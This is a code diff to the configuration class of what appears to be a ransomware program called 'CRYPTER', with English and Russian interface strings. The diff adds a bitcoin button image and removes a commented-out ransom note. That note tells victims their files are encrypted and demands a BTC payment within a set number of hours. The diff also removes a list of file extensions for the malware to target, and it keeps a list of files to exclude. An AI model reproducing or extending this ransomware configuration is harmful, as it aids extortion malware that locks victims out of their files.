@@ -37,6 +37,7 @@ class Base():
     
     # GUI SCHEMA
     GUI_IMAGE_LOGO = "lock.bmp"
+    GUI_IMAGE_BUTTON = "bitcoin.bmp"
     GUI_LABEL_TEXT_TITLE = {
         "eng": "CRYPTER",
         "ru": u"КРИПТЕР"
@@ -101,62 +102,6 @@ class Base():
         "eng": "A list of encrypted files was not found",
         "ru": u"A list of encrypted files was not found"
     }
-    
-    '''
-    @note: Not currently being used because this needs to be defined at a later point
-    to bring in the runtime config settings
-    GUI_RANSOM_MESSAGE = {
-        "eng": (
-          "The important files on your computer have been encrypted with"
-          " military grade AES-256 bit encryption.\n\nYour documents, videos"
-          " images and other forms of data are now inaccessible, and cannot"
-          " be unlocked without the decryption key. This key is currently"
-          " being stored on a remote server.\n\nTo acquire this key, transfer"
-          " a total of %s BTC to the Bitcoin wallet address below within %s"
-          " hours.\n\nIf you fail to take action within this time window,"
-          " the decryption key will be destroyed and access to your files"
-          " will be permanently lost." % 
-          (BITCOIN_FEE, (KEY_DESTRUCT_TIME_SECONDS / 60 / 60))
-          ),
-        "ru": (
-          u"The important files on your computer have been encrypted with"
-          u" military grade AES-256 bit encryption.\n\nYour documents, videos"
-          u" images and other forms of data are now inaccessible, and cannot"
-          u" be unlocked without the decryption key. This key is currently"
-          u" being stored on a remote server.\n\nTo acquire this key, transfer"
-          u" a total of %s BTC to the Bitcoin wallet address below within %s"
-          u" hours.\n\nIf you fail to take action within this time window,"
-          u" the decryption key will be destroyed and access to your files"
-          u" will be permanently lost." % 
-          (BITCOIN_FEE, (KEY_DESTRUCT_TIME_SECONDS / 60 / 60))
-          )
-        }
-    '''
-                          
-
-    FILETYPES = [
-                # GENERAL FORMATS
-                "sln",
-
-                # IMAGE FORMATS
-                "jpg", "png",
-
-                # VIDEO FORMATS
-                "mp4", "avi", "mkv",
-
-                # DOCUMENT FORMATS
-                "doc", "docx", "txt", "pdf",
-
-                # SOUND FORMATS
-                "mp3",
-
-                # EXE FORMATS
-                "exe", "msi", "php",
-
-                # COMPRESSION FORMATS
-                "tgz", "zip", "rar"
-                ]
-    
     
     FILES_TO_EXCLUDE = [
         "key.txt"
